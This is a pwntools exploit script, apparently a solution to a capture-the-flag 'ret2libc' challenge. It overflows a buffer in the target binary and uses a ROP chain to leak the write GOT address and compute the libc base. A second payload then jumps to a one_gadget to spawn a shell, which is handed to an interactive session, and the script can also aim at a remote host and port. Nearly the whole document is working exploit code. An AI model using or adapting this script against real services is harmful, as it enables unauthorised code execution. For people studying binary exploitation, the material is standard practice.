#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
if debug:
    context.log_level = "debug"
exe = "./ret2libc"
e = ELF(exe)
context.arch = e.arch
context.terminal = ["tmux","splitw","-h"]

arena64 = 0x3c4b20
arena32 = 0x1b2780

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = e.libc

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

# 0x0000000000400613 : pop rdi ; ret
# 0x0000000000400611 : pop rsi ; pop r15 ; ret
p_rdi = 0x400613
pp_rsi = 0x400611
w_plt = e.plt["write"]
w_got = e.got["write"]
vul = e.symbols["vul"]

p1 = flat(["A"*24,p_rdi,1,pp_rsi,w_got,1,w_plt,vul])

ru("hello")
sl(p1)
write_addr = u64(r(8))
libc.address = write_addr - libc.symbols["write"]
sys = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

one = libc.address + 0xf1147
p2 = flat(["A"*24,one])
sl(p2)

p.interactive()

